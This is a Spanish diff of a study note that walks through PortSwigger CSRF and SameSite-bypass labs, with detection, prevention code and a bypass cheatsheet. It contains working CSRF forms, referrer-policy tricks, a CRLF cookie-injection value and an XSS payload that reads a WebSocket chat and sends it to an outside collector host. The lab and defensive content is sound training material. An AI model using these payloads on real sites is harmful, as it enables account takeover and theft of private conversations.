-Esta máquina es bastante sencilla. El objetivo, por decirlo de alguna forma, es tramitar una petición por `GET` y forzar a esta misma para que se presente como `POST`. Es algo extraño encontrar esto en las webs, ya que depende mucho de la lógica que se esté implementando por detrás en la web, pero puede ser útil:
+Objetivo: tramitar por `GET` (que sí arrastra cookies `SameSite=Lax`) una acción pensada para `POST`:
+
 ![[Pasted image 20250911160958.png]]
-Ahora esa petición vamos a pasarla a `GET`:
+
+Pasamos la petición a `GET`:
+
 ![[Pasted image 20250911161026.png]]
-Así tal cual como vemos no funciona, pero concatenando el parámetro `_method=POST` puede funcionar:
+
+No funciona tal cual, pero concatenando `_method=POST` puede funcionar:
+
 ![[Pasted image 20250911161157.png]]
 
 > [!tip] `_method` Parameter Override
-> Algunas aplicaciones web permiten anular el método HTTP real de una solicitud (por ejemplo, de `GET` a `POST`) mediante un parámetro de consulta o de cuerpo llamado `_method`. Esto es común en frameworks que buscan simplificar el manejo de rutas RESTful. Si una aplicación valida el método HTTP antes de verificar las cookies `SameSite`, un atacante podría enviar una solicitud `GET` (que permite cookies `SameSite=Lax`) y luego usar `_method=POST` para que la aplicación la procese como `POST`, eludiendo así la protección `SameSite=Lax` para métodos `POST`.
+> Algunas apps permiten anular el método HTTP real mediante un parámetro `_method` (común en frameworks RESTful: Rails, Laravel). Si la app procesa el override **después** de decidir si adjunta/comprueba cookies, el atacante envía un `GET` (con cookies `Lax`) que la app trata como `POST`.
 
-Tomando esto en cuenta, para resolver solo vamos a crear una web que apunte tal y como lo tenemos en el Burp Suite y debería funcionar. El código es el siguiente:
 ```html
 <script>
   location = "https://0a0d00e804c10b71808d0d2900ed00c9.web-security-academy.net/my-account/change-email?email=Hacker%40hack.com&_method=POST";
 </script>
 ```
 
-![[Pasted image 20250911161513.png]]Listo.
+![[Pasted image 20250911161513.png]]
 ![[Pasted image 20250911161529.png]]
 Lab Terminado.
 
 ### Lab: SameSite Strict bypass via client-side redirect
 
-Al igual que en los otros laboratorios, el objetivo es cambiar el correo electrónico y para esto, como siempre, vamos a capturar cómo se efectúa la petición para este cambio:
+Objetivo: cambiar el correo. Capturamos la petición:
 
 ![[Pasted image 20250911161939.png]]
 
-Vemos cómo se tramitan las peticiones y es que no tenemos un `csrf`. Intentemos tramitar la petición por `GET` a ver si se puede hacer:
+No hay `csrf`; la petición por `GET` funciona:
+
 ![[Pasted image 20250911162322.png]]
-Perfecto, sí podemos hacerlo. En este punto, podemos crear la web maliciosa e intentar solo con un script llamar a la web y ver si se resuelve:
+
+Creamos la web maliciosa y solo llamamos a la web con un script:
 
 ![[Pasted image 20250911162449.png]]
+
 En este punto, vemos si se resuelve el lab:
+
 ![[Pasted image 20250911162522.png]]
-Pues no, no se resuelve y puede que algo raro esté pasando. Vamos a ver cómo se tramita el exploit para entender:
+
+No se resuelve — algo raro está pasando. Vemos cómo se tramita el exploit para entender:
+
 ![[Pasted image 20250911163304.png]]
-Primero vemos que en la petición no estamos arrastrando cookies y lo que nos llama la atención es que tiene el `SameSite=Strict`, el cual no permite arrastrar las cookies.
 
-Entonces, lo que tenemos que hacer es que toda la inyección tiene que darse en la misma página, por lo que tenemos que burlar el `SameSite=Strict`. Para esto, vamos a buscar algo que nos permita cargar la web desde su mismo origen.
+Toda la inyección debe darse **desde el mismo origen**. Buscamos algo que cargue la web desde su origen: al publicar un post, la app se redirige sola tras unos segundos. Tras el historial hay una petición con un script que usa `postId` y `blogPath`:
 
-Revisando la web, me encontré que al realizar una publicación de un post, solito se redirige al mismo sin darle a regresar luego de unos segundos. Revisando el historial, me encontré con la siguiente petición:
 ![[Pasted image 20250911165422.png]]
-Esta es la web para confirmar que se subió y regresar, pero la misma luego de unos segundos realiza otra petición que sería la siguiente:
 ![[Pasted image 20250911165539.png]]
-En este vemos que se llama a un script el cual, por cómo está construido, tenemos el parámetro `postId` que usamos en la petición anterior. Esto nos redirige a `blogPath` que, como nos redirige en la página original a la ruta completa, y `/post/` era `la ruta/post/`, por último, inserta el valor de `postId`. Lo que podemos intentar es ver si el valor puede ser el que queramos:
+
+Probamos si `postId` es controlable:
+
 ![[Pasted image 20250911165925.png]]
 
-Y vemos que al redirigirnos hace:
 ![[Pasted image 20250911165947.png]]
-Sí nos redirige; aunque no encuentra el test, nos permite redirigir.
 
-En este punto, lo que podemos hacer es ver si en la parte exacta del `test` le podemos hacer `../my-account` y ver si nos redirige:
+Sí redirige. Ahora probamos `../my-account` en la ruta:
+
 ![[Pasted image 20250911170228.png]]
 ![[Pasted image 20250911170241.png]]
-Por cómo no nos saca de la cuenta, podemos ver que sí nos arrastra la cookie. Entonces, en este punto lo que podemos hacer es en ese punto, inyectar la URL para el cambio de correo de la siguiente manera:
+
+No nos saca de la cuenta: la cookie viaja. Inyectamos la URL de cambio de correo en el redirect:
 
 ![[Pasted image 20250911170548.png]]
-Está muy bien, pero aún no nos va a funcionar, ya que cosas como el segundo `?` y el `&` nos van a dar problemas, así que vamos a codificar la URL y vemos cómo nos queda:
+
+Pero el segundo `?` y el `&` dan problemas — codificamos la URL:
+
 ![[Pasted image 20250911170748.png]]
-Vemos si ahora funciona:
+
 ![[Pasted image 20250911170818.png]]
 Lab Terminado.
 
 ### Lab: SameSite Strict bypass via sibling domain
 
-En este laboratorio, al parecer el objetivo es conseguir credenciales válidas. Vamos a ver qué tenemos en la web:
+Objetivo: credenciales válidas. Vemos la web:
 
 ![[Pasted image 20250911173502.png]]
 ![[Pasted image 20250911173623.png]]
-Escribimos en el chat y nos responde lo que parece texto predefinido. En este punto, lo que vamos a hacer es ver cómo se está tramitando el chat:
+
+Escribimos en el chat y responde texto predefinido. El chat usa `/chat` y emite un recurso JS:
+
 ![[Pasted image 20250911174328.png]]
-Vemos que bajo el `/chat` se realiza la petición, pero luego de esta petición lo que tenemos es otro recurso JS que se emite:
 ![[Pasted image 20250911174815.png]]
 
-Miramos que en esta petición tenemos un `Access-Control-Allow-Origin` el cual carga un dominio diferente. Vamos a revisar qué es eso:
+En esta petición hay un `Access-Control-Allow-Origin` que carga un dominio diferente. Vamos a revisar qué es eso:
+
 ![[Pasted image 20250911175008.png]]
 
-Perfecto, tenemos un dominio aparte el cual cumple con el mismo origen. Es verdad que el subdominio no es el mismo, pero el origen sí, por lo que si logramos de alguna forma desde este realizar un redirect, debería por concepto arrastrarse la cookie.
+Es un **dominio hermano** (subdominio distinto, mismo *site*). Desde ese hermano, un redirect arrastraría la cookie con `SameSite=Strict` (mismo sitio). Primero intentamos leer el chat vía WebSockets:
 
-Bueno, por ahora lo primero que quiero intentar es ver si puedo obtener información del chat. Se están empleando WebSockets, por lo que vamos a revisar el historial de WebSockets a ver cómo se tramita:
 ![[Pasted image 20250911182109.png]]
 
-Vemos que lo primero que se tramita es un `READY` y luego de esto, comenzamos con los mensajes del chat. Con esto claro, vamos a crear un pequeño script primero para intentar obtener los mensajes del chat, de la siguiente manera:
+El flujo: `READY` y luego mensajes. Script para capturar y exfiltrar:
+
 ```html
 <script>
   var ws = new WebSocket("/chat");
@@ -443,82 +510,67 @@ Vemos que lo primero que se tramita es un `READY` y luego de esto, comenzamos co
 </script>
 ```
 
-Perfecto, en este script jugamos con WebSockets para generar una conexión y, como vimos que al comenzar, envía un `READY` (parece ser el que inicia el chat). Luego, vamos a guardar lo que nos responda y lo vamos a enviar en Base64 utilizando el Collaborator de Burp Suite. Vemos cómo se ve en el exploit y si esto funciona:
 ![[Pasted image 20250911194809.png]]
 
 ![[Pasted image 20250911195012.png]]
 
-Perfecto, sí nos llegó al Collaborator la cadena en Base64, así que vamos a ver qué es lo que contiene:
+Sí nos llegó al Collaborator la cadena en Base64 — vamos a ver qué contiene:
+
 ![[Pasted image 20250911195211.png]]
 
-Bueno, estamos viendo cómo si abrimos un nuevo chat, esto es debido a que estamos cargando desde un servidor ajeno o tercero, lo que sucede es que por el `SameSite=Strict` no nos arrastra la cookie de sesión.
+Es un chat nuevo (sin cookies: SameSite=Strict). Hay que ejecutarlo desde el mismo origen. Regresamos a la web de login:
 
-Entonces, en este punto tenemos que buscar una forma de realizar esto desde el mismo origen para que funcione.
-
-Regresemos a la web de login que encontramos con anterioridad:
 ![[Pasted image 20250911195711.png]]
 
-Vemos que se refleja lo que escribo. Intentemos inyecciones XSS:
+Refleja el username — probamos XSS:
+
 ![[Pasted image 20250911195749.png]]
-Sí nos interpreta el código. En este punto, vamos a intentar ejecutar nuestro script anterior dentro del `username` a ver qué sucede:
+
+Funciona. Ejecutamos nuestro script dentro del `username`:
+
 ![[Pasted image 20250911195910.png]]
 ![[Pasted image 20250911200219.png]]
-Perfecto, sí nos llegó la información nuevamente de todas las conversaciones. Es posible que ya nos esté arrastrando las conversaciones. Vamos a crear un archivo con toda la información y a intentar pasar de Base64 a normal para ver si es parte de la conversación:
+
+Llega la información de **todas** las conversaciones (arrastra la cookie). Verificamos el contenido:
 
 ![[Pasted image 20250911200514.png]]
 
-Tenemos el chat, perfecto, sí funciona.
+Tenemos el chat. Ahora interceptamos y probamos desde el navegador:
 
-Perfecto, ahora con esto claro, vamos a interceptar la petición para ver cómo se está tramitando:
 ![[Pasted image 20250911201816.png]]
-Vemos que cambiando el método a `GET` también se envía, aunque no funciona del todo, ya que no me llega nada en el Collaborator. En este punto, vamos a intentar desde el navegador a ver qué ocurre:
 ![[Pasted image 20250911202109.png]]
 ![[Pasted image 20250911202035.png]]
 
-Perfecto, también está llegando la información. En este punto, podemos armar de esa forma una petición para nuestra página maliciosa, quedando:
+Armando la petición desde la página maliciosa (payload URL-encoded en el username):
+
 ```html
 <script>
-  location = "https://cms-0a33003004623d1c801f039100240050.web-security-academy.net/login?username=%3Cscript%3E+++var+ws+%3D+new+WebSocket(%22https%3A%2F%2F0a33003004623d1c801f039100240050.web-security-academy.net%2Fchat%22)%3B+++ws.onopen+%3D+function+()+{+++++ws.send(%22READY%22)%3B+++}%3B++++ws.onmessage+%3D+function+(info)+{+++++fetch(%22https%3A%2F%2Fx1zz0gg8jcgwzi86ac0683igo7uyis6h.oastify.com%2F%3Fdata%3D%22+%2B+btoa(info.data))%3B+++}%3B+%3C%2Fscript%3E&password=112341234"
+  location = "https://cms-0a33003004623d1c801f039100240050.web-security-academy.net/login?username=%3Cscript%3E+++var+ws+%3D+new+WebSocket(%22https%3A%2F%2F0a33003004623d1c801f039100240050.web-security-academy.net%2Fchat%22)%3B+++ws.onopen+%3D+function+(){+++++ws.send(%22READY%22)%3B+++}++++ws.onmessage+%3D+function+(info){+++++fetch(%22https%3A%2F%2Fx1zz0gg8jcgwzi86ac0683igo7uyis6h.oastify.com%2F%3Fdata%3D%22+%2B+btoa(info.data))%3B+++}+%3C%2Fscript%3E&password=112341234"
 </script>
 ```
 
 ![[Pasted image 20250911202234.png]]
-Enviemos y veamos si obtenemos algo:
+
 ![[Pasted image 20250911202307.png]]
-Perfecto, nos acaba de llegar la información. Vamos a copiar todo lo que tengamos a un archivo y ver qué contiene esa conversación:
+
+Llega la información — contiene un usuario `carlos` y su contraseña:
+
 ![[Pasted image 20250911202530.png]]
-Listo, al parecer tenemos un usuario `carlos` y una contraseña:
 ![[Pasted image 20250911202645.png]]
 Lab Terminado.
 
 ### Lab: SameSite Lax bypass via cookie refresh
 
-En este caso, tenemos la configuración del `SameSite` que pasa a ser `Lax`, la cual nos permite enviar solicitudes desde el mismo sitio y, en las solicitudes de otros sitios, solo mediante el método `GET`.
-En este caso, volvemos al cambio de email, el cual es vulnerable. Además, este lab tiene un inicio de sesión basado en `OAuth`, un estándar diseñado para permitir que un sitio web o una aplicación accedan a recursos alojados por otras aplicaciones web. Para entenderlo más fácilmente, es como cuando damos permisos para iniciar sesión mediante Google en otra web.
-
-Bueno, veamos cómo está esto aplicado:
+`SameSite=Lax`. El cambio de email es vulnerable y hay login por **OAuth**:
 
 ![[Pasted image 20250911213948.png]]
 
-Obtengamos las solicitudes que se realizaron al iniciar sesión:
+Flujo: login → redirect → confirmación → home. Lo relevante: el login OAuth emite la cookie de sesión con `Set-Cookie` **sin atributos de seguridad**:
 
-El flujo del programa es el siguiente: este nos envía para hacer el login y, una vez que lo hacemos, nos redirige a una web que nos pide confirmación y nos manda al `home`. Ahora, en este proceso, lo significativo es cuando se aplica `OAuth`, que es justo el momento después de hacer login. Lo que sucede es que la web nos asigna una cookie temporal con la cual nos manejamos fuera del sistema, pero al iniciar sesión se genera la petición de `OAuth`, la cual permite asignar la nueva cookie de sesión generada:
 ![[Pasted image 20250911215652.png]]
-Como vemos en la imagen, en la respuesta, vemos el `Set-Cookie` y la nueva cookie de la que hacemos uso. Ahora, si revisamos esta cookie, no lleva seguridad, lo que quiere decir que en este punto exacto nosotros comenzamos a arrastrar la cookie. El objetivo es cambiar el email de algún usuario, y el campo del email es completamente vulnerable. Entonces, lo primero que intentamos es un cambio común:
-```html
-<form class="login-form" name="change-email-form"
-  action="https://0a5600af03a720c480fc4415003000b5.web-security-academy.net/my-account/change-email" method="POST">
-  <input required="" type="email" name="email" value="Hacked@hacked.com">
-</form>
 
+En ese punto la cookie viaja. El cambio de email es vulnerable, pero el form simple no funciona (la víctima puede no tener la cookie recién emitida). Solución: primero cargar el flujo OAuth en una ventana (que refresque la cookie) y luego enviar el formulario:
 
-<script>
-  document.forms[0].submit();
-</script>
-```
-
-Si usamos esto y lo enviamos, veremos que no funciona. En ese caso, la mentalidad es la siguiente: si no funciona, puede ser que el usuario no esté con la sesión activa, lo que quiere decir que no está con la cookie necesaria para funcionar. ¿Cómo solucionamos esto?
-Aquí entra en juego la petición la cual incrusta la nueva cookie, y es que si el usuario ya tenía una sesión iniciada, vamos a encargarnos de primero cargar la web de `OAuth` y esperar un momento (esto para que la cookie sea correcta), y luego de eso, provocamos que cargue el formulario y lo hacemos de la siguiente manera:
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/my-account/change-email" method="POST">
@@ -535,7 +587,6 @@ Aquí entra en juego la petición la cual incrusta la nueva cookie, y es que si 
 </script>
 ```
 
-En este caso, lo primero que hacemos es con `window.open` cargar la web, tratando de que se genere la nueva cookie. Luego esperamos 5 segundos y llamamos a la función `onload` que enviará el formulario. Vemos si funciona:
 ![[Pasted image 20250911221254.png]]
 
 ![[Pasted image 20250911221309.png]]
@@ -543,15 +594,17 @@ Lab Terminado.
 
 ### Lab: CSRF where Referer validation depends on header being present
 
-El objetivo no cambia, es el mismo: cambiar el email de algún usuario.
+Objetivo: cambiar el email.
 
 > [!info] Cabecera `Referer`
-> La cabecera `Referer` (con la ortografía incorrecta original) es un campo de cabecera HTTP opcional que identifica la dirección de la página web desde la que se realiza la solicitud. Mediante una verificación de este campo, el servidor del nuevo sitio puede determinar de dónde se originó la solicitud. Es comúnmente utilizada como una medida de seguridad para prevenir CSRF, asegurando que la solicitud provenga de una página legítima dentro del mismo dominio.
+> (Con la ortografía errónea original.) Indica la página desde la que se realiza la solicitud. Algunas apps la validan para prevenir CSRF: si la petición viene del mismo origen, pasa.
 
-Bueno, lo primero que vamos a hacer es ver cómo se tramita la petición para el cambio de email:
+Lo primero: ver cómo se tramita la petición de cambio de email:
+
 ![[Pasted image 20250911222054.png]]
 
-No vemos ninguna seguridad robusta de las que hemos tocado, ni nada más allá del Referer. Algo que suele emplearse es que se compara el Referer para ver si la solicitud se está tramitando por el mismo origen. Intentamos recrear el formulario y enviarlo a ver si funciona:
+No vemos tokens ni SameSite; puede haber validación de Referer. Formulario simple:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
@@ -566,18 +619,17 @@ No vemos ninguna seguridad robusta de las que hemos tocado, ni nada más allá d
 ![[Pasted image 20250911222414.png]]
 
 ![[Pasted image 20250911222430.png]]
-Vemos que no funciona; esto me da a entender que está verificando la cabecera Referer.
 
-Si capturamos la petición del exploit, veremos lo siguiente:
+No funciona; al capturar el exploit vemos que el Referer cambia y causa el rechazo:
+
 ![[Pasted image 20250911222617.png]]
 
-Como podemos observar, el Referer sí está cambiando, ya que se está ejecutando con uno diferente, lo que está causando el conflicto.
+Si borramos la cabecera en Repeater, la petición pasa:
 
-Ahora que tenemos la solicitud, si borramos la cabecera, ¿esto se sigue validando?:
 ![[Pasted image 20250911222751.png]]
-Pues no, si la eliminamos, nos permite el cambio sin ningún problema.
 
-Entonces, nuestro objetivo es quitar la cabecera Referer, pero desde el exploit. Esto lo vamos a intentar de la siguiente manera con ayuda de etiquetas `meta`:
+Objetivo: quitar el Referer desde el exploit, con `<meta>`:
+
 ```html
 <html>
 
@@ -596,12 +648,9 @@ Entonces, nuestro objetivo es quitar la cabecera Referer, pero desde el exploit.
 
 </html>
 ```
-No todas, pero algunas cabeceras son manipulables desde el HTML, como la de `Referrer`. Recordemos que esta cabecera, por definición en HTML, es `Referrer` y ortográficamente también es así, pero por un error ortográfico en las cabeceras, cuando se tramita, lo hace como `Referer`.
 
 > [!tip] Política `no-referrer`
-> La política `no-referrer` en la etiqueta `<meta name="referrer" content="no-referrer">` indica al navegador que no envíe la cabecera `Referer` en ninguna solicitud saliente. Esto puede ser útil para eludir validaciones de `Referer` que esperan un valor específico o la ausencia de la cabecera para permitir la acción.
-
-Bueno, ahora vemos si podemos completar el lab con esto:
+> `<meta name="referrer" content="no-referrer">` indica al navegador no enviar la cabecera en ninguna solicitud saliente — útil contra validaciones que esperan la ausencia de Referer.
 
 ![[Pasted image 20250911223657.png]]
 ![[Pasted image 20250911223643.png]]
@@ -609,12 +658,12 @@ Lab Terminado.
 
 ### Lab: CSRF with broken Referer validation
 
-En este último laboratorio, el objetivo es el mismo: cambiar el correo electrónico, donde seguimos haciendo uso del concepto del Referer.
+Último lab: mismo objetivo, validación de Referer **rota**. Capturamos el cambio de email; sin token:
 
-Vamos a capturar, como de costumbre, la petición para el cambio de email a ver qué nos encontramos:
 ![[Pasted image 20250911224205.png]]
 
-No vemos que se emplee algún token, por lo que de inmediato creamos el envío del formulario automático a ver qué logramos:
+Formulario automático:
+
 ```html
 <form class="login-form" name="change-email-form"
   action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
@@ -628,27 +677,19 @@ No vemos que se emplee algún token, por lo que de inmediato creamos el envío d
 
 ![[Pasted image 20250911224606.png]]
 
-Lo probamos y vemos lo siguiente:
 ![[Pasted image 20250911224629.png]]
 
-Podemos intentar lo mismo que en el anterior, eliminando el campo `Referrer`, pero no va a funcionar en esta ocasión.
+Quitar el Referer no funciona esta vez. Analizamos cómo se valida: quitando caracteres no pasa, pero **agregando** información sí (la validación es por subcadena):
 
-Capturemos la solicitud y vamos a intentar algunas cosas:
 ![[Pasted image 20250911224859.png]]
-Como ya se intentó, si eliminamos el Referer, no vamos a lograr pasar, por lo que en este punto lo que podemos intentar es ver cómo se está validando esa cabecera.
-
-Podemos intentar primero eliminando caracteres:
 ![[Pasted image 20250911225103.png]]
-Vemos que no. Ahora intentamos agregar información:
 ![[Pasted image 20250911225136.png]]
-Excelente, al parecer nosotros podemos agregar información como deseemos, ya que, por ejemplo, solo busca que en la cadena exista el patrón con el que se compara, que es el dominio exacto.
 
-Entonces, nosotros podemos agregar a esto lo que queramos. Podemos intentar cambiar el nombre del archivo por el dominio; esto, por lógica, debería funcionar, pero no lo hará debido a las políticas del `Referrer`. Para solucionarlo, vamos a usar la política `unsafe-url`, la cual permite que en el `Referer` se incruste toda la URL por completo, incluidos los parámetros y todo lo que esté después del dominio dado.
+Podemos usar el nombre del archivo como dominio, pero por defecto el navegador recorta el path del Referer; la política `unsafe-url` envía la URL completa incluyendo el path:
 
 > [!warning] Política `unsafe-url`
-> La política `unsafe-url` en la etiqueta `<meta name="referrer" content="unsafe-url">` indica al navegador que envíe la URL completa (incluyendo el *path* y la *query string*) como valor de la cabecera `Referer`. Esta política es considerada "insegura" porque puede filtrar información sensible en la URL a sitios de terceros. Sin embargo, en escenarios de bypass de CSRF con validación de `Referer` rota, puede ser explotada si la aplicación solo busca una subcadena del dominio en el `Referer` y no valida la URL completa.
+> `<meta name="referrer" content="unsafe-url">` envía la URL completa (path y query) en el Referer. Es "insegura" por filtrar datos a terceros — pero aquí se explota para que la subcadena del dominio aparezca en el Referer vía el nombre de archivo.
 
-Con eso en cuenta, nuestro script va a quedar de la siguiente manera:
 ```html
 <html>
 
@@ -667,7 +708,112 @@ Con eso en cuenta, nuestro script va a quedar de la siguiente manera:
 
 </html>
 ```
+
 ![[Pasted image 20250911230025.png]]
 
 ![[Pasted image 20250911230119.png]]
 Lab Terminado.
+
+## Detección (defensor)
+
+- WAF/IDS: peticiones de estado (POST/PUT/DELETE) sin cabecera `Origin`/`Referer` esperada, o con `Referer` cross-site hacia rutas de acción.
+- Logs: acciones sensibles seguidas de redirect inmediato desde un origen externo (patrón de form autoenviado).
+- Auditoría de código: endpoints de acción sin verificación de token ni SameSite.
+- Pruebas automatizadas: OWASP ZAP/Burp con checks de CSRF sobre cada form y endpoint de estado.
+
+## Impacto
+
+1. **Acciones autenticadas**: transferencias, cambio de email/contraseña, eliminación de cuenta, publicación de contenido, compras.
+2. **Bypass de MFA en flujos sin step-up**: la sesión ya autenticada realiza la acción.
+3. **Cascada con XSS**: si el XSS logra leer tokens (o el CSRF fija cookies), ambas vulnerabilidades se potencian (lab de sibling domain).
+4. **Account takeover** cuando la acción vulnerable es "cambiar email" o "resetear credenciales" — como en casi todos los labs.
+
+## Prevención (con código)
+
+```python
+# Django: token por sesión + validación (se inserta automáticamente en forms)
+# {% csrf_token %} en el template; el middleware valida el token en cada POST
+
+# Express + csurf (o doble submit propio)
+const csrf = require('csurf')();
+app.get('/perfil', csrf, (req, res) =>
+  res.render('perfil', { csrfToken: req.csrfToken() }));
+app.post('/cambiar-email', csrf, cambiarEmailHandler);   // 403 si el token no valida
+
+# Cookie de sesión con SameSite
+res.cookie('session', sid, {
+  httpOnly: true, secure: true, sameSite: 'Lax',   // 'Strict' si no hay flujos cross-site
+});
+```
+
+```http
+# Validación de origen (complemento, no sustituto del token)
+# Nginx: rechazar POST sin Origin/Referer del propio dominio
+if ($request_method ~ "POST") {
+    set $bad_origin "1";
+    if ($http_origin ~* "(https://)?(www\.)?ejemplo\.com$") { set $bad_origin "0"; }
+    if ($http_referer  ~* "^https://(www\.)?ejemplo\.com/")  { set $bad_origin "0"; }
+    if ($bad_origin = "1") { return 403; }
+}
+```
+
+Reglas de diseño (defensa en profundidad):
+1. **Token CSRF por sesión** (o por petición), comparado en servidor, incluido en todo form/endpoint de estado; rechazar si falta (no solo si está presente y no coincide — lab "present-only").
+2. **`SameSite=Lax`** por defecto en cookies de sesión (+`Secure`+`HttpOnly`). `Strict` si la UX lo permite.
+3. **Validación Origin/Referer** como segunda capa: allowlist exacta por comparación de host, **nunca subcadena** (lab "broken Referer").
+4. **No aceptar acciones de estado por GET** y rechazar method overrides inesperados (`_method`).
+5. **Re-autenticación** para acciones críticas (cambio de email/contraseña, pagos).
+6. Ver que los tokens no se dupliquen en cookies legibles (double submit bien implementado: cookie firmada o token de sesión server-side, no comparación ingenua igual-igual).
+
+## Errores comunes
+
+**Atacante:**
+1. Enviar el form con el token de tu sesión sin comprobar si está atado a la cuenta de la víctima (labs "not tied to session"/"tied to non-session cookie").
+2. Probar solo el form simple y rendirse ante `SameSite=Lax/Strict`: hay bypass conocidos (method override, redirect client-side, hermanos de dominio, cookie refresh).
+3. Olvidar el **URL-encoding** en payloads dentro de la URL (el lab de sibling domain lo requiere).
+4. No medir si la app acepta el token omitido vs token incorrecto: son comportamientos distintos (present-only).
+
+**Defensor (falsas soluciones):**
+1. **Validar el token solo si está presente** — omitir el campo lo salta.
+2. **Depender solo de SameSite** — hermanos de dominio, method override, redirects y cookies `None` lo rompen; los navegadores legacy no lo aplican.
+3. **Validar Referer por subcadena** (`contains("ejemplo.com")`) — se salta con `evil.com?ejemplo.com` o `unsafe-url`.
+4. **Permitir POST vía GET por conveniencia** — Lax solo protege el POST.
+5. **Duplicar el token en cookie** sin validar server-side el valor de sesión — el atacante fija ambos con CRLF.
+6. Creer que el clickjacking está cubierto por el token CSRF — ver [[Clickjacking Ataques]].
+
+## Cheatsheet
+
+| Bypass | Payload/ajuste |
+|---|---|
+| Sin defensas | `<form ...><script>document.forms[0].submit()</script>` |
+| Token omitible | Form sin campo `csrf` |
+| Método | `method=GET` / `_method=POST` override |
+| SameSite=Lax | GET top-level + override; OAuth cookie refresh |
+| SameSite=Strict | Redirect client-side desde mismo origen; subdominio hermano |
+| Referer ausente | `<meta name="referrer" content="no-referrer">` |
+| Referer subcadena | `<meta name="referrer" content="unsafe-url">` + path = dominio |
+| Cookie fijada | `%0d%0aSet-Cookie:%20csrfKey=X;%20SameSite=None` en parámetro reflejado |
+| Token no atado | Robar token de la cuenta A, usarlo en la B |
+
+| Señal | Lectura |
+|---|---|
+| 302 tras POST sin token | Posible CSRF total |
+| Rechazo con Referer cross-site | Validación de Referer — probar ausencia/subcadena |
+| Cookies no viajan en POST cross-site | SameSite=Lax — probar bypasses |
+| Igualdad form==cookie | Double submit débil |
+
+## Laboratorios y referencias
+
+- PortSwigger Academy — CSRF (todos los labs de arriba): https://portswigger.net/web-security/csrf
+- OWASP — CSRF Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+- MDN — SameSite cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
+- Google — schemeful same-site: https://web.dev/schemeful-same-site/
+
+## Relacionadas
+
+- [[Cross-Site Scripting XSS]] — el XSS roba tokens CSRF y convierte cualquier CSRF en acción elegida; los labs combinados lo demuestran
+- [[Clickjacking Ataques]] — el otro "engaña al clic": los tokens no detienen el clickjacking
+- [[Vulnerabilidades CORS y Laboratorios]] — política del navegador mal configurada que sí permite lectura cross-origin
+- [[Vulnerabilidades OAuth en PortSwigger Labs]] — el flujo OAuth como fuente de cookies frescas (lab cookie refresh)
+- [[HTTP Host header attacks]] — el Host header es otra señal de origen falsificable
+- [[Session Puzzling Session Fixation y Session Variable Overloading]] — fijar cookies de sesión como primitive de ataque
